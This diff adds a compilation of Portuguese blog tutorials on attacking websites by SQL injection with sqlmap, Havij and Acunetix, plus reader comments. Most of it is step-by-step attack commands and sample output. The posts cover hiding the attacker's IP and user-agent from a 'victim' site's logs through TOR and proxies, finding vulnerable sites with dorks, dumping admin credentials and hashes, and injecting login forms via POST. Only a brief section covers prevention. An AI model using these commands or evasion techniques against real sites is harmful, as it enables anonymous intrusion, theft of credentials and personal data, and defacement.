@@ -1,0 +1,369 @@
+http://secdigital.blogspot.com.br/2016/04/atacar-usando-sql-injection-anonimo.html
+
+Atacando Anônimo com SQL Injection
+ Bruno Assis Autor Bruno Assis Data 4/08/2016 05:54:00 PM
+ TAGS
+DEFACER
+TUTORIAIS
+Se você acha que é só ligar o TOR ou algum outro proxy e fazer o ataque está muito enganado. Precisamos também configurar a ferramenta, caso contrário você ainda está exposto. Nesse tutorial irei abordar 3 ferramentas: SQLMap (muito utilizado na plataforma Linux), Havij (windows) e Acunetix (scan de vulnerabilidades).
+
+SQLMap
+
+Geralmente atacamos da seguinte maneira:
+
+sqlmap -u vitima.com.br --dbs
+
+Com isso os logs no site saíram assim:
+
+200.98.45.235 - - [08/Abr/2016:17:21:59 -0300] "GET / HTTP /1.1"  200 321 "-" sqlmap/0.9 -rc4 (vitima.com.br)
+200.98.45.235 - - [06/Abr/2014:17:22:00 -0300] "GET / HTTP /1.1"  200 321 "-" sqlmap/0.9 -rc4 (vitima.com.br)
+200.98.45.235 - - [06/Abr/2014:17:22:00 -0300] "GET / HTTP /1.1"  200 321 "-" sqlmap/0.9 -rc4 (vitima.com.br)
+200.98.45.235 - - [06/Abr/2014:17:22:01 -0300] "GET / HTTP /1.1"  200 321 "-" sqlmap/0.9 -rc4 (vitima.com.br)
+
+Nos logs, informações importantes são expostas, como o IP verdadeiro, mesmo usando o TOR, e o user-agent do browser, que no caso é sqlmap.
+
+O primeiro passo é alterar o user-agent:
+
+sqlmap -u vitima.com.br --dbs --user-agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10"
+
+E os logs são expostos dessa maneira:
+
+200.98.45.235 - - [08/Abr/2016:17:24:12 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+200.98.45.235 - - [06/Abr/2014:17:24:12 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+200.98.45.235 - - [06/Abr/2014:17:24:13 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+200.98.45.235 - - [06/Abr/2014:17:24:15 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+
+Para camuflar bem o ataque podemos utilizar duas maneiras:
+
+sqlmap -u vitima.com.br --dbs --random-agent  --tor --tor-type=SOCKS5
+
+sqlmap -u vitima.com.br --dbs --user-agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10" --proxy=http://127.0.0.0:9666
+
+OBS.: Na segunda forma estou usando o proxy Ultrasurf.
+Assim, os logs saíram da seguinte maneira:
+
+66.23.129.31 - - [08/Abr/2016:17:30:02 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+66.23.129.31 - - [06/Abr/2014:17:30:03 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+66.23.129.31 - - [06/Abr/2014:17:30:04 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+66.23.129.31 - - [06/Abr/2014:17:30:04 -0300] "GET / HTTP /1.1"  200 321 "-" Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20160408 Firefox/40.1.10
+
+
+Havij
+
+Como é interface gráfica, é muito mais fácil. Primeiro vá em settings, general, marque a caixa "proxy" e no espaço digite 127.0.0.1 e na porta:9666 (TOR não pode ser utilizado no Havij, já que é um socks)
+Em "Http Headers" altere o User-Agent para qualquer um de sua preferência, mas não deixe a padrão;
+E clique em "Apply"
+
+
+
+
+Acunetix
+
+Vá em Configuration>Scan Settings>LAN Settings
+Marque a caixa "Use an Http Proxy Server" e em "hostname" digite 127.0.0.1 e em "port" digite 9666.
+Agora vá em HTTP Options e altere o UserAgent
+
+OBS.: No Acunetix é possível usar o TOR como socks.
+
+
+
+
+
+
+
+
+
+Outros user-agent que podem ser úteis futuramente:
+
+Internet Explorer: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
+Mozilla Firefox: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2
+Opera: Opera/9.23 (Windows NT 5.1; U; en-US)
+Safari: Opera/9.23 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1
+
+
+http://www.brutalsecurity.com.br/2015/12/29/guia-sqli-sqlmap-e-prevencao/
+
+Guia – SQLi com sqlmap e prevenção
+29/12/2015Leonardo
+use-sqlmap-sql-injection-to-hack-a-website-and-database-blackmore-ops-10
+
+Leitores, já estava pensando em fazer indicações de ferramentas para uso no “pen-test” ou para uso diário, porém, achei que um post com uma lista não iria ser muito interessante pois não teria o tutorial de como usá-las, então resolvi, na medida do possível, fazer posts apresentando as ferramentas (que podem ser conhecidas por você) e um tutorial básico de uso da mesma. O primeiro post foi sobre scan em rede com o Armitage e está disponível clicando aqui.
+
+Hoje vou falar sobre o sqlmap, uma poderosa ferramenta para automatizar ataques em bancos de dados. A grande vantagem em relação ao “ataque manual” é que a ferramenta consegue injetar muito mais payloads e strings numa velocidade muito maior que qualquer humano, além de possuir um sistema de “anonimização” que permite usar proxy/vpn junto à ferramenta, além de poder ser usado um “simulador” de header (para que o site alvo gere saídas para um navegador comum).
+
+Antes de começar com o tutorial propriamente dito, já aviso que o material abaixo foi testado no Linux, mas a sintaxe de sistema para sistema é muito parecida, sendo talvez necessário somente adaptar a forma como o programa será executado no terminal ou linha de comando. Outra coisa é que ela já vem por padrão em diversas distribuições de pen-test, e está nos repositórios de diversas outras, bastando instalar pelo apt-get/yumi. Também é possível utilizá-la a partir de uma pasta, somente executando-a sem a necessidade de instalação.
+
+Atenção
+
+O conteúdo abaixo é de caráter ditádico e educacional. Invasão de sistemas é crime previsto na Lei 12737/12 (“Lei Carolina Dieckmann”) disponível na íntegra.
+
+Não nos responsabilizamos pelo uso mal intencionado do material, nem de possíveis danos causados à terceiros.
+
+SQLMap
+
+Antes de tudo, é preciso encontrar um site vulnerável. Existem muitas maneiras de fazer isso, como por exemplo usando as dorks nos motores de busca, ou mesmo navegando no site alvo. O link vulnerável geralmente se parece com o abaixo (genérico):
+
+http://sitealvo.com/…/paginaqualquer.extensao?acaonadb=valor
+Exemplos mais precisos podem ser:
+
+http://alvo.com.br/web/index.php?id=1
+https://site.org/conteudo/mostra.php?id=10&pagina=2
+http://www.sitequalquer.net/busca.php?palavra=teste
+http://www.facebook.com/photo/search.asp?key=5550123
+http://banco.us/account/name.html?id=9876&data=321
+Então ao se deparar com um link em um dos formatos acima, um teste simples pode ser feito com a aspa simples (‘), de duas formas:
+
+http://alvo.com/busca.php?search=teste’
+http://alvo.com/busca.php?search=’teste
+Ou ainda, se houver mais de um parâmetro:
+
+https://www.google.com/q.asp?key=000’&id=999′
+https://www.google.com/q.asp?key=’000&id=’999
+https://www.google.com/q.asp?key=000’&id=999
+https://www.google.com/q.asp?key=000&id=999′
+Assim como é feito no modo “manual”, com os testes acima, busca-se gerar um erro no banco de dados, que no caso de estar vulnerável, exibirá o erro parecido com isso:
+
+SQL Query Error on line 1
+Error in document.open on line 52
+Ou qualquer outro erro (geralmente escrito em vermelho) no navegador. Geralmente, um reload com conteúdo fora do lugar ou com pedaços da página faltando, também pode ser sinal de erro no banco e não foi exibido (o administrador pode ter desabilitado a exibição das mensagens de erro).
+
+Já no terminal:
+
+sqlmap -u LINKALVO -a
+Esse comando, chama o sqlmap, mostra a ele qual o link a ser testado (com o -u) e pede para que ele busque toda informação que conseguir sobre o servidor (com o -a).
+
+Um exemplo de ataque em busca de senhas num site com a url site.com/join.php?id=1 seria assim:
+
+sqlmap -u http://site.com/join.php?id=1 –dbs
+Esse comando me retornará todas as db’s disponíveis, a saída será algo assim:
+
+available databases [3]:
+
+[*]information_shema
+[*]site
+[*]teste
+No caso de haver dezenas ou centenas de data bases, podemos usar o comando abaixo:
+
+sqlmap -u http://site.com/join.php?id=1 –current-db
+E ele retornará algo assim:
+
+current-db: site
+Então agora irei pegar as tabelas dessa db:
+
+sqlmap -u http://site.com/join.php?id=1 -D site –tables
+A saída será:
+
+Database: site
+[2 tables]
++——–+
+|admin|
+|user    |
++——–+
+Agora, verificar o que tem nas colunas:
+
+sqlmap -u http://site.com/join.php?id=1 -D site -T admin –columns
+Obtendo algo como:
+
+Database: site
+Table: admin
++————-+——————+
+| user             | varchar(500) |
+| password | pass(1024)     |
++————-+——————+
+Então finalmente, obtendo os dados das colunas:
+
+sqlmap -u http://site.com/join.php?id=1 -D site -T admin -C user,password –dump
+Temos:
+
++——–+—————————————————+
+| user     | password                                                              |
++——–+—————————————————+
+| admin | 21232f297a57a5a743894a0e4a801fc3 |
+| ze          | 39b389d4e5f7c6ef6b7f4707d20fff8e    |
++——–+—————————————————+
+Como pode perceber, as senhas estão criptografadas. Nesse caso, seria ideal usar um hash identifier e então um hash cracker para obter o texto plano das mesmas.
+
+Com as senhas em mãos, entrar no site pelo cpanel ou página de administração pode ser o próximo passo. Porém o método mostrado acima, permite buscar qualquer tipo de dado que esteja exposto na db vulnerável, como por exemplo, cpf’s, números de cartão de crédito, endereços, telefones e qualquer outra coisa disponível. Caso se obtenha uma saída maior que 256 linhas, o próprio sqlmap alerta que a saída é grande e gera uma tabela plana no formato csv que fica em /opt/sqlmap/output/LINKALVO/dump/ (por padrão), porém pode ser que esteja armazenado em outro lugar do computador (geralmente, no primeiro uso, o programa alerta: “Using /user/desktop/sqlmap for output”).
+
+Para usar com proxy é só usar o –proxy assim:
+
+sqlmap -u http://site.com/join.php?id=1 –dbs –proxy=http://127.0.0.1:3128
+Podemos emular um browser também:
+
+sqlmap -u http://site.com/join.php?id=1 –dbs –random-agent
+Ou ainda aumentar os testes feitos na url:
+
+sqlmap -u http://site.com/join.php?id=1 –dbs –level=5 –risk=3
+Caso exista mais de um parâmetro:
+
+sqlmap -u http://site.com/join.php –dbs –data=”?id=1&page=10&cont=9″ –param-del=”&”
+Se tiver usando proxy/vpn é bom aumentar o “timeout”:
+
+sqlmap -u http://site.com/join.php?id=1 –dbs –proxy=http://127.0.0.1:3128 –time-sec=10
+DICA: É possivel mesclar os diversos comandos em um só para um melhor resultado.
+
+Prevenção
+
+Sem dúvida que uma dica válida é sem dúvida manter atualizados os serviços, o servidor, seu sistema e qualquer outro web app afinal as atualizações quase sempre trazem melhorias importantes e de segurança. Se inscrever na lista de e-mail do serviço usado pode ser uma saída, ou ainda estar em constante consulta pelas novidades e novas versões. Tomar cuidado com as portas abertas e serviços rodando no servidor, tentar deixar somente o essencial para o funcionamento do mesmo.
+
+Um jeito fácil de verificar o servidor em busca disso é usando o NMap, que pode ser facilmente executado no terminal:
+
+nmap 127.0.0.1
+Ou então executar um scan completo:
+
+nmap -sS -sU -T4 -A -v 127.0.0.1
+Ou ainda mais completo:
+
+nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 –script “default or (discovery and safe)” 127.0.0.1
+Atente-se à saída que o NMap lhe dará, pois às vezes ele mesmo mostra se um serviço está desatualizado.
+
+Outro scanner rápido é o nikto (já instalado no Kali Linux):
+
+nikto –url http://seu-site.com/
+Outra opção é o uniscan:
+
+uniscan -u http://seu-site.com/ -qeds
+Scanners mais profissionais seriam o Nessus, que pode ser conhecido clicando aqui ou o Nexpose, disponível aqui.
+
+Uma outra dica é filtrar todas as entradas que serão executadas no banco pois evitam injeções e também os ataques de Cross Site Script (XSS). Também se pode remover todas as páginas em que um upload possa ser feito e mover a página de administração (se houver) para outro lugar (que não seja o padrão), sendo que isso pode ser feito para qualquer pasta ou arquivo (como o de senhas).
+
+Criptografar também é outra dica quente, de preferência use um algoritmo próprio ou a combinação de dois ou mais, usar o TLS/SSL (HTTPS) no site evita que uma possível interceptação ou roubo de dados tenha uma efetividade maior.
+
+Como o processo varia muito de programa a programa, vou linkar um tutorial da OWASP sobre prevenção de SQLi, lá eles tratam dos mais diversos sistemas e maneiras de ajudar a prevenir. Não se esqueça que o Google também pode ajudar muito para casos mais específicos.
+
+Tutorial da OWASP (em inglês): Clique aqui
+
+Dúvidas e sugestões, entre no nosso grupo no Facebook.
+
+Até a próxima!
+
+COMANDOS - SQLMAP Injetando via POST.
+sqlmap de uma forma diferente
+COMANDOS   -   SQLMAP Injetando via POST.
+
+
+COMANDOS   -   SQLMAP Injetando via POST.
+sqlmap.py --url *************** --current-db
+sqlmap.py --url *************** -D 'databasedosite' --tables
+sqlmap.py --url *************** -D 'databasedosite' -T 'tabeladosite' --columns sqlmap.py --url *************** -D 'databasedosite' -T 'tabeladosite" -C 'colunasdosite' --dump
+
+
+ANALISANDO DADOS PARA O ATAQUE VIA POST
+
+Vamos ao agora enviar via post.
+Exemplo uma tela de login e senha!, como injetar com sqlmap ??
+alvo:http://www.pagina.com.br/login.phpUrl para onde é enviado os posts usuario e senha, como saber qual url. Abra o codigo fonte e veja analise o fonte
+
+
+<form  action="validar/lt.php" method="post"  >
+<input type="text" name="login">
+<input type="text" name="senha">
+</form>
+
+No caso para onde é enviado os posts "campos login e senha".
+URL alvo:http://www.pagina.com.br/validar/ls.php 
+sqlmap.py --url http://www.pagina.com.br/validar/ls.php --data "login=admin#2*&senha=123#1*" --dbs
+#2* e #1* Indica que são campos posts e os mesmo devem ser injetados 
+
+DEIXANDO SEU AGENT HTTP RANDÔMICO
+Vamos incrementar o comandos no teste.--ramdon-agent ou seja ele vai ramdomizar seu Agent http://en.wikipedia.org/wiki/User_agentEX:
+Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405
+A cada requisição ele vai mudar seu user agent:
+sqlmap.py --url http://www.pagina.com.br/validar/ls.php --data "login=admin#2*&senha=123#1*" --dbs --random-agent
+
+
+SETANDO PROXY
+Para ficar não ficar exposto utilizer o parâmetro proxy sempre.--proxy="SEU PROXY:PORTA"
+ex:
+sqlmap.py --url http://www.pagina.com.br/validar/ls.php --data "login=admin#2*&senha=123#1*" --dbs --random-agent --proxy="SEU PROXY:PORTA"
+
+MODELO 2 DE INJETAR SQL VIA POST
+Agora vamos utilizar a segunda forma de injetar via post.Lendo um arquivo de requisição post via sqlmap, com o comando "-r"Precisamos criar arquivo com o nome fica sua escolha configurado devidamente.Ex:
+
+POST http://www.pagina.com.br/validar/ls.php HTTP/1.1
+Host: www.pagina.com.br
+Origin: http://www.pagina.com.br/
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.54.16 (KHTML, like Gecko) Version/5.1.4 Safari/534.54.16
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOMD4054CXIAin1BB
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer:  http://www.pagina.com.br/login.php
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=ea4b4f69b0ed5e611b0d1b5ff5c7e9f9;
+Pragma: no-cache
+Connection: keep-alive
+Proxy-Connection: keep-alive
+Content-Length: 468
+
+------WebKitFormBoundaryOMD4054CXIAin1BB
+Content-Disposition: form-data; name="login#1*"
+
+admin
+------WebKitFormBoundaryMDad4054CXIAin1BB
+Content-Disposition: form-data; name="senha#1*"
+
+1234
+
+depois de salvar o conteúdo acima no arquivo post.txt,Vamos executalo
+../sqlmap.py -r post.txt --dbs --random-agent --proxy="SEU PROXY:PORTA"
+
+
+"Conhecimento livre & Com responsabilidade"
+By: MARIA OLIVEIRA às sexta-feira, dezembro 21, 2012   
+Enviar por e-mail
+BlogThis!
+Compartilhar no Twitter
+Compartilhar no Facebook
+Compartilhar com o Pinterest
+
+Marcadores: post, sqlmap
+MARIA OLIVEIRA
+
+7 comentários:
+
+Bruno Fernando30 de novembro de 2013 18:54
+bom obrigado
+
+Responder
+
+Hamanom SILVESTRE21 de julho de 2015 12:13
+Bem a forma que ele esta mostrando a cima eu fiz doro perfeito bem mais simples voce ter varios modelos para guardar em servidores pela internet.
+Para ajudar também vou colocar um cod.
+
+./sqlmap.py -u IP_ALVO --level=5 --regexp --string --text-only --alert --crawl=CRAWLDEPTH --random-agent --dbms=mysql
+
+Obrigado pelo tutor TKS
+
+Responder
+Respostas
+
+Anônimo4 de janeiro de 2016 20:21
+nem sempre o servidor e mysql
+
+Responder
+
+Regiane Sousa21 de novembro de 2015 15:49
+./sqlmap.py -g --flush-session='OpParis.txt' --dbms=MYSQL TESTADO OK
+
+Responder
+
+Regiane Sousa21 de novembro de 2015 15:49
+./sqlmap.py -g --flush-session='OpParis.txt' --dbms=MYSQL TESTADO OK
+
+Responder
+
+joaolucas marcilino18 de janeiro de 2016 10:55
+sqlmap -r /root/Desktop/post.txt --dbs --random-agent
+
+Quando não especificamos o caminho aonde deve ser feito a leitura, da erro maioria das vezes !
+
+Responder
+
+Anônimo28 de dezembro de 2016 01:51
+No decore do ataque sqlmap aparece um ids,ips waf firewall o que fazer sou novo no mundo hacker
+
+Responder
+
+
+https://www.youtube.com/watch?v=yrKQSWSwCc0
+
